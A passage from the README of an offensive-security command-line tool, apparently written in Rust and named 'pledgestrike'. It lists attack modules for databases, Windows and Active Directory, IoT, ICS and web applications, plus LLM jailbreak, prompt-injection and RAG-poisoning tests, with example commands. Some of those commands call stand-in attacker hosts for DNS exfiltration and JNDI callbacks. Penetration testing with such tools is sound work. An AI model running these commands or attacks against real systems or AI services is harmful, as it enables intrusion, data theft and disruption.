- **amplify** — SNMP amplification tester — tests GetBulk, GetNext, MIB walk for amplification factor

### Redis Direct Exploit (`redisx`)
- **access** — Redis unauthorized access — tests unauthenticated access, brute common passwords
- **rce** — Redis RCE tester — tests cron persistence, SSH key persistence, web shell persistence, module loading
- **lua** — Redis Lua scripting abuse — tests eval, info disclosure, config read, key dump, file read, command exec
- **exfil** — Redis data exfiltration — dumps all keys, DB size, config, client list, slowlog, monitor

### Elasticsearch Attack (`elastic`)
- **expose** — Elasticsearch exposure detection — checks open instances, management endpoints
- **dump** — Elasticsearch data exfiltration — lists indices, searches documents, dumps mappings
- **script** — Elasticsearch script injection — tests Painless, Groovy, search template, stored script injection
- **reindex** — Elasticsearch reindex abuse — tests SSRF via reindex, data manipulation, pipeline injection

### AMQP/RabbitMQ Attack (`amqp`)
- **access** — AMQP unauthorized access — tests default credentials, checks management interface
- **inject** — AMQP message injection — tests poison queue, fake alerts, config override, command injection, SSRF
- **flood** — AMQP queue flooding — sends 500 messages, tests unbounded queue creation
- **mgmt** — AMQP management API abuse — enumerates overview, nodes, users, vhosts, exchanges, queues, creates admin user

### IPMI Attack (`ipmi`)
- **cipher0** — IPMI Cipher 0 auth bypass — tests authentication bypass, RAKP hash extraction
- **default** — IPMI default credential tester — tests 16+ common BMC credentials
- **dump** — IPMI BMC info dump — extracts device ID, firmware, manufacturer, MAC, IP, GUID, user list
- **bmc** — BMC exploitation tester — checks Supermicro, Dell iDRAC, HP iLO, Intel, Fujitsu, Lenovo, Cisco, Oracle vulnerabilities

### CoAP/IoT Protocol Attack (`coap`)
- **discover** — CoAP resource discovery — queries .well-known/core, probes common IoT resources
- **amplify** — CoAP amplification tester — tests GET, POST, block-wise transfer, multicast, observe for amplification
- **access** — CoAP unauthorized access — tests GET/POST/PUT/DELETE on config, admin, firmware, system resources
- **cache** — CoAP cache poisoning — tests Max-Age manipulation, ETag spoofing, observe hijacking, and response replay

### Memcached Attack (`memcache`)
- **access** — Unauthorized access test — checks for exposed interface, default endpoints, and management port
- **stats** — Stats dump — retrieves server stats, settings, items, slabs, and connection info
- **dump** — Data dump — extracts cached items, slabs, and key data from exposed instances
- **slab** — Slab exploitation — enumerates slabs, runs cachedump to extract stored keys

### MongoDB Attack (`mongo`)
- **access** — Unauthorized access test — checks HTTP interface, admin, config, and test database exposure
- **dump** — Data dump — extracts data from admin, config, local, and test databases
- **inject** — NoSQL injection — auth bypass, admin extraction, regex DoS, $where injection, boolean blind
- **enum** — Enumeration — server status, database list, build info, host info, users, and roles

### VNC Attack (`vnc`)
- **access** — Unauthorized access test — checks for noVNC web interface and common endpoints
- **brute** — Credential brute force — tests 10 common passwords against VNC login
- **bypass** — Auth bypass — empty password, null, type confusion, array, and object injection
- **enum** — Enumeration — probes display endpoints, extracts server headers, detects RFB protocol

### Telnet Attack (`telnet`)
- **brute** — Credential brute force — tests 12 common credential pairs
- **enum** — Enumeration — detects login prompts, service type, and server headers
- **inject** — Command injection — chain, pipe, newline, background, and subshell payloads
- **banner** — Banner grab — extracts HTTP status, headers, and body preview

### SIP/VoIP Attack (`sip`)
- **enum** — Enumeration — detects SIP service, extracts Allow/Supported/Accept/Contact headers
- **brute** — Credential brute force — tests common extensions and passwords for registration
- **register** — Registration attack — fake caller, extension hijack, domain spoof, auth bypass
- **invite** — INVITE attack — toll fraud, call forwarding, ghost calls, re-INVITE hijacking

### RTSP Camera Attack (`rtsp`)
- **enum** — Enumeration — probes live, stream, video, h264, mjpeg, and API endpoints
- **brute** — Credential brute force — tests 11 common credential pairs
- **stream** — Stream access — probes 10 common stream paths, detects video/multipart content types
- **cred** — Default credential test — vendor-specific creds for Hikvision, Dahua, DLink, Foscam, Axis, Ubiquiti

### NFS Exploitation (`nfs`)
- **enum** — Enumeration — detects NFS service, probes exports, rpc, mount, and nfsstat endpoints
- **mount** — Mount test — probes common mount paths (/, /home, /var, /tmp, /opt, /srv, /mnt, /data, /backup)
- **export** — Export list — retrieves export lists, detects wildcard and no_root_squash misconfigurations
- **access** — Unauthorized access — attempts to read /etc/passwd, /etc/shadow, /root, /home, /var/log

### X11 Attack (`x11`)
- **enum** — Enumeration — detects X11 service, probes display, xterm, and VNC endpoints
- **keylog** — Keylogger test — queries keymap, tests KeyPress/KeyRelease/ButtonPress/MotionNotify event selection
- **screenshot** — Screenshot capture — attempts to grab screen image via X11 GetImage request
- **bypass** — Auth bypass — no auth, empty cookie, wildcard, and spoofed host attacks

### STOMP Messaging Attack (`stomp`)
- **connect** — Connection test — detects STOMP/ActiveMQ, tests default credentials
- **inject** — Message injection — poison messages, fake alerts, config overrides, command injection, SSRF
- **flood** — Queue flooding — sends 500 messages to flood queues, tests unbounded queue creation
- **enum** — Enumeration — probes admin console, queues, topics, subscribers, connections, network, and stats

### TFTP Attack (`tftp`)
- **read** — File read — attempts to read /etc/passwd, /etc/shadow, /etc/hosts, config, firmware, and startup files
- **write** — File write test — attempts to write test files to common upload paths
- **brute** — Path brute force — brute-forces 15 common file paths (config, backup, firmware, license, etc.)
- **enum** — Enumeration — checks service status, server header, and body preview

### WHOIS Recon (`whois`)
- **lookup** — WHOIS lookup — retrieves registration data for a domain
- **reverse** — Reverse WHOIS — finds domains registered to the same entity
- **enum** — Data enumeration — extracts registrar, registrant, admin, tech, name servers, dates, and status
- **abuse** — Abuse contact extraction — finds abuse contact information from WHOIS records

### Finger Protocol Recon (`finger`)
- **enum** — User enumeration — queries 10 common system users via finger protocol
- **brute** — User brute force — tests 20 common usernames for existence
- **redirect** — Redirect attack — chain redirects, cross-query, pipe injection, newline injection
- **bomb** — Finger bomb — wildcard queries, all-users query, long query, multiple wildcards

### ZooKeeper Attack (`zookeeper`)
- **env** — Environment dump — retrieves Java version, user directory, and environment variables
- **dump** — Data dump — extracts data from zookeeper, config, services, brokers, and app znodes
- **brute** — Credential brute force — tests 9 common credential pairs
- **srvr** — Server info — queries srvr, stat, conf, cons, dirs, and ruok commands

### etcd Attack (`etcd`)
- **access** — Unauthorized access — checks v2/v3 API endpoints, health, and version
- **dump** — Data dump — extracts keys from config, secrets, services, registry, and cluster paths
- **keys** — Key enumeration — enumerates keys in config, secrets, services, registry, network, calico, and credentials
- **auth** — Auth bypass — tests auth endpoints, attempts empty password authentication

### UPnP/SSDP Attack (`upnp`)
- **discover** — Discovery — probes rootDesc.xml, device descriptions, and SSDP endpoints
- **expose** — Port exposure — tests WANIPConn1/WANPPPConn1 control endpoints, attempts AddPortMapping
- **inject** — SOAP injection — XSS in description, command injection, SSRF via client, XXE injection
- **flood** — Amplification flood — sends 200 M-SEARCH SSDP discover requests, tests amplification potential

### IDOR Tester (`idor`)
- **test** — Vulnerability test — tests IDOR by manipulating object IDs in URLs (increment, decrement, UUID, encoded)
- **enum** — Enumeration — enumerates sequential and predictable object IDs across multiple endpoints
- **predict** — Pattern prediction — analyzes ID patterns and predicts next/adjacent values
- **chain** — Chain attack — chains IDOR with other vulns (SSRF, auth bypass, data exfil)

### Mass Assignment Attack (`mass`)
- **check** — Vulnerability check — tests for mass assignment by injecting privileged fields
- **inject** — Field injection — injects role/admin/permission fields into JSON/POST data
- **escalate** — Privilege escalation — attempts to escalate privileges via mass assignment
- **enum** — Field enumeration — enumerates accepted fields by testing common parameter names

### Cookie Attack (`cookie`)
- **fixation** — Session fixation — tests session fixation via cookie injection and manipulation
- **inject** — Cookie injection — SQLi, XSS, CRLF, path traversal, template injection via cookies
- **tamper** — Cookie tampering — admin flag, user override, auth bypass, debug mode via cookies
- **overflow** — Buffer overflow — tests cookie value overflow with long payloads

### Session Attack (`session`)
- **fixation** — Session fixation — tests session ID fixation via URL, cookie, and forced session
- **predict** — Token prediction — analyzes session token patterns for predictability
- **hijack** — Session hijacking — attempts session hijacking with predictable/guessed tokens
- **puzzle** — Session puzzle — tests session puzzle attacks by mixing session states

### RCE Scanner (`rce`)
- **detect** — Detection — detects RCE via command injection markers (uid, root, Windows, Python, Node, PHP)
- **inject** — Injection — injects OS commands via common parameters (cmd, exec, command, run, q)
- **chain** — Chain attack — chains RCE with reverse shell, file write, and data exfiltration
- **oob** — Out-of-band — tests OOB RCE detection via DNS/HTTP callbacks

### Spring Boot Actuator (`actuator`)
- **env** — Environment dump — dumps /actuator/env for secrets, credentials, and config
- **heapdump** — Heap dump — downloads /actuator/heapdump and scans for sensitive data
- **jolokia** — Jolokia exploit — exploits Jolokia MBean for RCE via MLet and createMBean
- **shutdown** — Shutdown — attempts to shutdown the application via /actuator/shutdown

### Debug/Info Endpoint Scanner (`debug`)
- **scan** — Endpoint scan — scans for debug/info endpoints (debug, actuator, metrics, env, info)
- **trace** — TRACE method — tests HTTP TRACE method for cross-site tracing (XST)
- **stack** — Stack trace — triggers and detects stack trace exposure
- **source** — Source exposure — tests for source code disclosure endpoints

### OpenAPI/Swagger Abuse (`openapi`)
- **spec** — Spec discovery — discovers OpenAPI/Swagger specs at common paths
- **fuzz** — Endpoint fuzzer — fuzzes discovered endpoints with common attack payloads
- **auth** — Auth bypass — tests auth bypass via header injection (Bearer, API key, internal, debug)
- **inject** — Parameter injection — injects payloads into discovered API parameters

### Unicode/Encoding Attack (`unicode`)
- **homoglyph** — Homoglyph attack — tests Unicode homoglyph substitution for spoofing/bypass
- **overlong** — Overlong UTF-8 — tests overlong UTF-8 encoding for filter bypass
- **bidi** — Bidi (Trojan Source) — tests Unicode bidi overrides for code obfuscation
- **normalize** — Normalization — tests Unicode normalization attacks for auth/filter bypass

### WSDL/SOAP Exploitation (`wsdl`)
- **parse** — Parser — parses WSDL files and extracts operations, bindings, and endpoints
- **inject** — Injection — injects SQLi/XSS/command injection payloads into SOAP parameters
- **xxe** — XXE — tests XML External Entity injection via SOAP requests
- **fuzz** — Fuzzer — fuzzes SOAP operations with malformed payloads

### NTLM Attack (`ntlm`)
- **relay** — Relay attack — tests NTLM relay to SMB, LDAP, HTTP, and MSSQL targets
- **pass** — Pass-the-hash — attempts NTLM pass-the-hash with common hash values
- **brute** — Brute force — brute forces NTLM authentication with common credentials
- **enum** — Enumeration — enumerates NTLM challenge info, server type, and auth endpoints

### WinRM Attack (`winrm`)
- **brute** — Brute force — brute forces WinRM authentication with common credentials
- **exec** — Remote execution — attempts remote command execution via WinRM SOAP
- **enum** — Enumeration — enumerates WinRM service, auth requirements, and endpoints
- **lateral** — Lateral movement — attempts lateral movement via WinRM (user creation, persistence, AV disable)

### Exchange Exploitation (`exchange`)
- **proxylogon** — ProxyLogon (CVE-2021-26855) — tests SSRF via X-BEResource header injection
- **proxyshell** — ProxyShell (CVE-2021-34473) — tests SSRF via autodiscover.json path abuse
- **proxynotshell** — ProxyNotShell (CVE-2022-41040/41082) — tests SSRF via PowerShell/RpcHttp paths
- **enum** — Enumeration — enumerates OWA, ECP, EWS, Autodiscover, MAPI, ActiveSync endpoints

### OWA Attack (`owa`)
- **brute** — Brute force — brute forces OWA authentication via Autodiscover XML
- **enum** — User enumeration — enumerates valid users via Autodiscover response differences
- **spray** — Password spray — password sprays across multiple users with common passwords
- **rule** — Inbox rule injection — injects malicious inbox rules (forward, delete, move)

### SharePoint Exploitation (`sharepoint`)
- **enum** — Enumeration — enumerates SharePoint endpoints, lists, users, groups, and REST API
- **brute** — Brute force — brute forces SharePoint authentication with common credentials
- **access** — Unauthorized access — tests unauthorized access to documents, lists, and search
- **inject** — Injection — tests XSS, SQLi, path traversal, and CSRF via SharePoint endpoints

---

## Architecture

- **Modular CLI** with subcommands — each attack module is independent under `src/modules/`
- **Clap** for CLI parsing, **Tokio** for async, **Rayon** for parallel cracking
- **Colored** for terminal output
- Single binary deployment — no runtime dependencies

## Build

```bash
cargo build --release
```

## Usage

```bash
pledgestrike <module> <subcommand> [options]
```

### Examples

```bash
# JWT decode
pledgestrike jwt decode --token "eyJhbGci..."

# SSRF probe
pledgestrike ssrf probe --target "http://target.com/fetch?url={SSRF}" --port 8080

# Rate limit burst test
pledgestrike ratelimit burst --url https://api.target.com/endpoint --count 100 --rate 50 --workers 10

# TLS scan
pledgestrike tls scan --host example.com

# IOC extraction
pledgestrike ioc extract --file /var/log/auth.log --types all --format json

# SQLi error-based scan
pledgestrike sqli error --url https://target.com/page --param id

# XSS reflected scan
pledgestrike xss reflect --url https://target.com/search --param q

# Command injection
pledgestrike cmdi os --url https://target.com/ping --param host

# XXE file read
pledgestrike xxe file --url https://target.com/api --file /etc/passwd

# LFI file read
pledgestrike lfi read --url https://target.com/page --param file --file /etc/passwd

# SSRF cloud metadata extraction
pledgestrike ssrf-chain metadata --url https://target.com/fetch --param url

# CORS origin test
pledgestrike cors origin --url https://target.com/api

# CRLF header injection
pledgestrike crlf header --url https://target.com/redirect --param url

# Open redirect scan
pledgestrike redirect scan --url https://target.com/redirect

# Cache poisoning
pledgestrike cache poison --url https://target.com/

# HTTP smuggling detection
pledgestrike smuggle detect --url https://target.com/

# WebSocket CSWSH test
pledgestrike ws cswssh --url https://target.com/ws

# GraphQL introspection
pledgestrike graphql-attack introspect --url https://target.com/graphql

# OAuth redirect URI test
pledgestrike oauth redirect --auth-url "https://target.com/auth?client_id=abc"

# SSTI detection
pledgestrike ssti detect --url https://target.com/page --param name

# Prototype pollution scan
pledgestrike proto scan --url https://target.com/api

# Race condition test
pledgestrike race race --url https://target.com/transfer --workers 20

# Host header password reset poisoning
pledgestrike host password --url https://target.com/reset --host attacker.com

# Access control IDOR test
pledgestrike acl idor --url https://target.com/api/user/1 --param id

# Subdomain takeover scan
pledgestrike takeover scan --wordlist subdomains.txt --domain target.com

# Cloud S3 bucket enum
pledgestrike cloud s3 --bucket target-backup

# Kubernetes pod enumeration
pledgestrike k8s pods --api https://k8s.target.com:6443 --token eyJhbGci...

# DNS rebinding attack
pledgestrike rebind attack --target http://router.local --rebind-delay 5

# Password spraying
pledgestrike spray spray --url https://target.com/login --users-file users.txt --password "Winter2024!" --delay 10

# Brute force HTTP Basic
pledgestrike brute http --url https://target.com/admin --users-file users.txt --pass-file passwords.txt --workers 8

# Generate XSS payloads
pledgestrike payload xss

# Encode a payload
pledgestrike payload encode --input "<script>alert(1)</script>" --encoding all

# DNS exfiltration test
pledgestrike exfil dns --domain evil.com --data "sensitive_data"

# Web fuzzer parameter fuzzing
pledgestrike wfuzz param --url https://target.com/search

# Deserialization detection
pledgestrike deser detect --url https://target.com/api

# Exploit database search
pledgestrike exploit search --query "RCE"

# Run exploit against target
pledgestrike exploit run --cve CVE-2017-5638 --target https://target.com/

# Verify vulnerability
pledgestrike exploit verify --cve CVE-2014-6271 --target https://target.com/cgi-bin/test

# LLM prompt injection
pledgestrike llm inject --url https://target.com/chat

# LLM jailbreak test
pledgestrike llm jailbreak --url https://target.com/chat

# AI agent tool injection
pledgestrike agent tool --url https://target.com/agent

# RAG poisoning attack
pledgestrike agent rag --url https://target.com/agent

# MFA fatigue bombing
pledgestrike mfa fatigue --url https://target.com/mfa --user admin@target.com --count 100 --delay 1

# MFA OTP race condition
pledgestrike mfa race --url https://target.com/mfa --user admin --otp 123456 --count 10

# SAML XSW attack
pledgestrike saml xsw --url https://target.com/saml/acs

# SAML assertion forgery
pledgestrike saml assertion --url https://target.com/saml/acs

# WebAuthn origin confusion
pledgestrike webauthn origin --url https://target.com/webauthn

# CSP analysis
pledgestrike csp analyze --url https://target.com/

# CSP bypass test
pledgestrike csp bypass --url https://target.com/ --callback https://attacker.com/x

# HTTP/2 Rapid Reset DoS
pledgestrike h2 rapidreset --url https://target.com/ --count 1000 --rate 100

# HTTP/2 stream abuse
pledgestrike h2 stream --url https://target.com/ --count 100

# JNDI LDAP injection
pledgestrike jndi ldap --url https://target.com/api --callback attacker.com:1389

# JNDI gadget chain delivery
pledgestrike jndi gadget --url https://target.com/api --callback attacker.com:1389 --cmd id

# Docker API exploitation
pledgestrike container docker --url http://target.com:2375

# Kubelet API abuse
pledgestrike container kubelet --url https://target.com:10250

# CI/CD pipeline injection
pledgestrike cicd inject --url https://target.com/api

# CI/CD webhook exploitation
pledgestrike cicd webhook --url https://target.com/webhook

# Typosquatting detection
pledgestrike supply typosquat --url https://registry.npmjs.org

# Dependency confusion attack
pledgestrike supply confusion --url https://target.com

# Subdomain brute force
pledgestrike subdom brute --domain target.com --wordlist subdomains.txt

# Subdomain CT log search
pledgestrike subdom ct --domain target.com

# JavaScript secret extraction
pledgestrike secret js --url https://target.com/app.js

# Docker layer secret extraction
pledgestrike secret docker --url https://registry.target.com/image:latest

# Web3 reentrancy detection
pledgestrike web3 reentrancy --url https://target.com/contract/0x123...

# Web3 access control test
pledgestrike web3 access --url https://target.com/contract/0x123...

# WebRTC IP leak detection
pledgestrike webrtc leak --url https://target.com/

# WebRTC STUN server abuse
pledgestrike webrtc stun --url https://target.com/
```

### Git Exposure & Repo Attack
```bash
# Scan for .git directory exposure
pledgestrike git expose --url https://target.com/

# Dump exposed git repository
pledgestrike git dump --url https://target.com/

# Test git hook injection
pledgestrike git hook --url https://target.com/ --token ghp_xxx

# Check GitHub Actions exploitation vectors
pledgestrike git actions --url https://github.com/target/repo --token ghp_xxx
```

### NoSQL Injection
```bash
# MongoDB injection test
pledgestrike nosqli mongo --url https://target.com/search --param q

# Redis Lua script injection
pledgestrike nosqli redis --url https://target.com/api --param cmd

# Cassandra CQL injection
pledgestrike nosqli cassandra --url https://target.com/query --param id

# Blind NoSQL injection (boolean + time-based)
pledgestrike nosqli blind --url https://target.com/search --param q
```

### gRPC Attack
```bash
# gRPC reflection API abuse
pledgestrike grpc reflect --url https://target.com:9090

# Method enumeration without auth
pledgestrike grpc method --url https://target.com:9090

# Metadata header injection
pledgestrike grpc meta --url https://target.com:9090

# Stream exhaustion DoS
pledgestrike grpc stream --url https://target.com:9090 --count 500
```

### Kerberos Attack
```bash
# Kerberoasting — extract TGS hashes
pledgestrike kerb roast --url https://dc.target.com/api

# AS-REP roasting — find no-preauth accounts
pledgestrike kerb asrep --url https://dc.target.com/api

# Diamond ticket — PAC manipulation
pledgestrike kerb diamond --url https://dc.target.com/api

# S4U delegation abuse
pledgestrike kerb s4u --url https://dc.target.com/api
```

### LDAP Injection
```bash
# LDAP filter injection
pledgestrike ldapi filter --url https://target.com/search --param username

# Blind LDAP injection
pledgestrike ldapi blind --url https://target.com/search --param username

# LDAP enumeration
pledgestrike ldapi enum --url https://dc.target.com/api

# Active Directory abuse
pledgestrike ldapi ad --url https://dc.target.com/api --token user
```

### postMessage Abuse
```bash
# Origin validation bypass
pledgestrike postmsg origin --url https://target.com/

# Generate injection payloads
pledgestrike postmsg inject --url https://target.com/

# Fuzz message listeners
pledgestrike postmsg fuzz --url https://target.com/

# Cross-frame chaining analysis
pledgestrike postmsg chain --url https://target.com/
```

### Service Worker Poisoning
```bash
# Discover service worker files
pledgestrike sw register --url https://target.com/

# Analyze hijacking vectors
pledgestrike sw hijack --url https://target.com/

# Check persistence mechanisms
pledgestrike sw persist --url https://target.com/

# Detect fetch interception
pledgestrike sw fetch --url https://target.com/
```

### WebAssembly Exploitation
```bash
# Analyze WASM binary
pledgestrike wasm analyze --url https://target.com/app.wasm

# Inspect WASM memory access
pledgestrike wasm memory --url https://target.com/app.wasm

# Check dangerous import functions
pledgestrike wasm import --url https://target.com/app.wasm

# Reverse engineering section enumeration
pledgestrike wasm reverse --url https://target.com/app.wasm
```

### MQTT/IoT Broker Attack
```bash
# MQTT auth bypass & weak credentials
pledgestrike mqtt connect --url https://iot-target.com:1883

# Topic wildcard injection
pledgestrike mqtt topic --url https://iot-target.com:1883

# Retained message poisoning
pledgestrike mqtt retain --url https://iot-target.com:1883

# Last Will message injection
pledgestrike mqtt will --url https://iot-target.com:1883
```

### OT/ICS/SCADA Attack
```bash
# Modbus TCP exploitation
pledgestrike ot modbus --url https://plc-target.com:502

# OT device enumeration
pledgestrike ot enum --url https://ot-target.com

# Register/coil write test
pledgestrike ot write --url https://plc-target.com:502

# HMI web interface scanner
pledgestrike ot hmi --url https://hmi-target.com
```

### Padding Oracle Attack
```bash
# Detect padding oracle vulnerability
pledgestrike padoracle detect --url https://target.com/decrypt --param ct

# Decrypt ciphertext via padding oracle
pledgestrike padoracle decrypt --url https://target.com/decrypt --param ct --ciphertext "AAAA..."

# Encrypt arbitrary plaintext
pledgestrike padoracle encrypt --url https://target.com/decrypt --param ct --plaintext "admin=true"

# CBC bit-flipping attack
pledgestrike padoracle bit --url https://target.com/decrypt --param ct --ciphertext "AAAA..."
```

### SSE Abuse
```bash
# SSE injection test
pledgestrike sse inject --url https://target.com/events

# Connection exhaustion DoS
pledgestrike sse exhaust --url https://target.com/events --count 500

# Data exfiltration from SSE stream
pledgestrike sse exfil --url https://target.com/events

# Event replay via Last-Event-ID
pledgestrike sse replay --url https://target.com/events
```

### Bluetooth/BLE Recon
```bash
# BLE device scan
pledgestrike ble scan --url https://ble-target.com/api

# GATT characteristic enumeration
pledgestrike ble gatt --url https://ble-target.com/api

# Write without response test
pledgestrike ble write --url https://ble-target.com/api

# MITM relay / pairing bypass
pledgestrike ble mitm --url https://ble-target.com/api
```

### NTP Abuse
```bash
# monlist info disclosure
pledgestrike ntp monlist --url https://ntp-target.com:123

# Amplification factor test
pledgestrike ntp amplify --url https://ntp-target.com:123

# Time manipulation
pledgestrike ntp time --url https://ntp-target.com:123

# Private mode commands
pledgestrike ntp peek --url https://ntp-target.com:123
```

### WebDAV Exploitation
```bash
# WebDAV method enumeration
pledgestrike webdav methods --url https://target.com/

# PROPFIND directory listing
pledgestrike webdav propfind --url https://target.com/

# PUT upload test (webshell)
pledgestrike webdav upload --url https://target.com/

# COPY/MOVE abuse
pledgestrike webdav copy --url https://target.com/
```

### DNS Zone Transfer & Enumeration
```bash
# DNS zone transfer test
pledgestrike dnsenum axfr --url https://target.com

# DNS record enumeration
pledgestrike dnsenum records --url https://target.com

# NSEC/NSEC3 zone walking
pledgestrike dnsenum nsec --url https://target.com

# DNS cache snooping
pledgestrike dnsenum snoop --url https://resolver.com
```

### CSRF Tester
```bash
# CSRF token bypass
pledgestrike csrf token --url https://target.com/form

# SameSite cookie bypass
pledgestrike csrf samesite --url https://target.com

# JSON CSRF
pledgestrike csrf json --url https://target.com/api

# Method-based CSRF
pledgestrike csrf method --url https://target.com/api
```

### Clickjacking Tester
```bash
# X-Frame-Options bypass
pledgestrike click frame --url https://target.com

# Iframe overlay detection
pledgestrike click overlay --url https://target.com

# Pointer event hijacking
pledgestrike click pointer --url https://target.com

# Cursor spoofing
pledgestrike click cursor --url https://target.com
```

### HTTP Parameter Pollution
```bash
# HPP detection
pledgestrike hpp detect --url https://target.com/page?id=1

# WAF bypass via HPP
pledgestrike hpp bypass --url https://target.com/search?q=test

# Auth bypass via HPP
pledgestrike hpp auth --url https://target.com/profile

# Business logic abuse
pledgestrike hpp logic --url https://target.com/checkout
```

### SMTP/Mail Attack
```bash
# SMTP open relay test
pledgestrike smtp relay --url https://mail-server.com:25

# SMTP header injection
pledgestrike smtp inject --url https://mail-server.com:25

# SPF/DKIM/DMARC bypass
pledgestrike smtp spf --url https://target.com

# SMTP command injection
pledgestrike smtp command --url https://mail-server.com:25
```

### FTP Server Attack
```bash
# FTP anonymous access
pledgestrike ftp anon --url https://ftp-server.com:21

# FTP bounce scan
pledgestrike ftp bounce --url https://ftp-server.com:21

# FTP directory traversal
pledgestrike ftp traverse --url https://ftp-server.com:21

# FTP backdoor check
pledgestrike ftp backdoor --url https://ftp-server.com:21
```

### SMB/NetBIOS Attack
```bash
# SMB share enumeration
pledgestrike smb enum --url https://smb-target.com:445

# SMB null session
pledgestrike smb null --url https://smb-target.com:445

# EternalBlue check
pledgestrike smb eternal --url https://smb-target.com:445

# SMB relay test
pledgestrike smb relay --url https://smb-target.com:445
```

### RDP Attack
```bash
# RDP enumeration
pledgestrike rdp enum --url https://rdp-target.com:3389

# BlueKeep check
pledgestrike rdp bluekeep --url https://rdp-target.com:3389

# RDP credential stuffing
pledgestrike rdp cred --url https://rdp-target.com:3389

# NLA bypass test
pledgestrike rdp nla --url https://rdp-target.com:3389
```

### SSH Audit
```bash
# SSH protocol audit
pledgestrike ssh audit --url https://ssh-target.com:22

# Weak cipher detection
pledgestrike ssh cipher --url https://ssh-target.com:22

# SSH user enumeration
pledgestrike ssh enum --url https://ssh-target.com:22

# SSH agent forwarding test
pledgestrike ssh agent --url https://ssh-target.com:22
```

### SNMP Attack
```bash
# SNMP community string brute
pledgestrike snmp brute --url https://snmp-target.com:161

# SNMP information dump
pledgestrike snmp dump --url https://snmp-target.com:161

# SNMP write test
pledgestrike snmp write --url https://snmp-target.com:161

# SNMP amplification test
pledgestrike snmp amplify --url https://snmp-target.com:161
```

### Redis Direct Exploit
```bash
# Redis unauthorized access
pledgestrike redisx access --url https://redis-target.com:6379

# Redis RCE test
pledgestrike redisx rce --url https://redis-target.com:6379

# Redis Lua scripting abuse
pledgestrike redisx lua --url https://redis-target.com:6379

# Redis data exfiltration
pledgestrike redisx exfil --url https://redis-target.com:6379
```

### Elasticsearch Attack
```bash
# Elasticsearch exposure detection
pledgestrike elastic expose --url https://es-target.com:9200

# Elasticsearch data exfiltration
pledgestrike elastic dump --url https://es-target.com:9200

# Elasticsearch script injection
pledgestrike elastic script --url https://es-target.com:9200

# Elasticsearch reindex abuse
pledgestrike elastic reindex --url https://es-target.com:9200
```

### AMQP/RabbitMQ Attack
```bash
# AMQP unauthorized access
pledgestrike amqp access --url https://rabbitmq-target.com:5672

# AMQP message injection
pledgestrike amqp inject --url https://rabbitmq-target.com:5672

# AMQP queue flooding
pledgestrike amqp flood --url https://rabbitmq-target.com:5672

# AMQP management API abuse
pledgestrike amqp mgmt --url https://rabbitmq-target.com:15672
```

### IPMI Attack
```bash
# IPMI Cipher 0 auth bypass
pledgestrike ipmi cipher0 --url https://bmc-target.com:623

# IPMI default credential test
pledgestrike ipmi default --url https://bmc-target.com:623

# IPMI BMC info dump
pledgestrike ipmi dump --url https://bmc-target.com:623

# BMC exploitation test
pledgestrike ipmi bmc --url https://bmc-target.com:623
```

### CoAP/IoT Protocol Attack
```bash
# CoAP resource discovery
pledgestrike coap discover --url coap://iot-target.com:5683

# CoAP amplification test
pledgestrike coap amplify --url coap://iot-target.com:5683

# CoAP unauthorized access
pledgestrike coap access --url coap://iot-target.com:5683

# CoAP cache poisoning
pledgestrike coap cache --url coap://iot-target.com:5683
```

### Memcached Attack
```bash
# Memcached unauthorized access
pledgestrike memcache access --url http://memcache-target.com:11211

# Memcached stats dump
pledgestrike memcache stats --url http://memcache-target.com:11211

# Memcached data dump
pledgestrike memcache dump --url http://memcache-target.com:11211

# Memcached slab exploitation
pledgestrike memcache slab --url http://memcache-target.com:11211
```

### MongoDB Attack
```bash
# MongoDB unauthorized access
pledgestrike mongo access --url http://mongo-target.com:27017

# MongoDB data dump
pledgestrike mongo dump --url http://mongo-target.com:27017

# MongoDB NoSQL injection
pledgestrike mongo inject --url http://mongo-target.com:27017

# MongoDB enumeration
pledgestrike mongo enum --url http://mongo-target.com:27017
```

### VNC Attack
```bash
# VNC unauthorized access
pledgestrike vnc access --url http://vnc-target.com:5900

# VNC credential brute force
pledgestrike vnc brute --url http://vnc-target.com:5900

# VNC auth bypass
pledgestrike vnc bypass --url http://vnc-target.com:5900

# VNC enumeration
pledgestrike vnc enum --url http://vnc-target.com:5900
```

### Telnet Attack
```bash
# Telnet credential brute force
pledgestrike telnet brute --url http://telnet-target.com:23

# Telnet enumeration
pledgestrike telnet enum --url http://telnet-target.com:23

# Telnet command injection
pledgestrike telnet inject --url http://telnet-target.com:23

# Telnet banner grab
pledgestrike telnet banner --url http://telnet-target.com:23
```

### SIP/VoIP Attack
```bash
# SIP enumeration
pledgestrike sip enum --url http://sip-target.com:5060

# SIP credential brute force
pledgestrike sip brute --url http://sip-target.com:5060

# SIP registration attack
pledgestrike sip register --url http://sip-target.com:5060

# SIP INVITE attack
pledgestrike sip invite --url http://sip-target.com:5060
```

### RTSP Camera Attack
```bash
# RTSP enumeration
pledgestrike rtsp enum --url rtsp://camera-target.com:554

# RTSP credential brute force
pledgestrike rtsp brute --url rtsp://camera-target.com:554

# RTSP stream access
pledgestrike rtsp stream --url rtsp://camera-target.com:554

# RTSP default credential test
pledgestrike rtsp cred --url rtsp://camera-target.com:554
```

### NFS Exploitation
```bash
# NFS enumeration
pledgestrike nfs enum --url http://nfs-target.com:2049

# NFS mount test
pledgestrike nfs mount --url http://nfs-target.com:2049

# NFS export list
pledgestrike nfs export --url http://nfs-target.com:2049

# NFS unauthorized access
pledgestrike nfs access --url http://nfs-target.com:2049
```

### X11 Attack
```bash
# X11 enumeration
pledgestrike x11 enum --url http://x11-target.com:6000

# X11 keylogger test
pledgestrike x11 keylog --url http://x11-target.com:6000

# X11 screenshot capture
pledgestrike x11 screenshot --url http://x11-target.com:6000

# X11 auth bypass
pledgestrike x11 bypass --url http://x11-target.com:6000
```

### STOMP Messaging Attack
```bash
# STOMP connection test
pledgestrike stomp connect --url http://stomp-target.com:61613

# STOMP message injection
pledgestrike stomp inject --url http://stomp-target.com:61613

# STOMP queue flooding
pledgestrike stomp flood --url http://stomp-target.com:61613

# STOMP enumeration
pledgestrike stomp enum --url http://stomp-target.com:61613
```

### TFTP Attack
```bash
# TFTP file read
pledgestrike tftp read --url http://tftp-target.com:69

# TFTP file write test
pledgestrike tftp write --url http://tftp-target.com:69

# TFTP path brute force
pledgestrike tftp brute --url http://tftp-target.com:69

# TFTP enumeration
pledgestrike tftp enum --url http://tftp-target.com:69
```

### WHOIS Recon
```bash
# WHOIS lookup
pledgestrike whois lookup --url http://whois-target.com

# Reverse WHOIS lookup
pledgestrike whois reverse --url http://whois-target.com

# WHOIS data enumeration
pledgestrike whois enum --url http://whois-target.com

# WHOIS abuse contact extraction
pledgestrike whois abuse --url http://whois-target.com
```
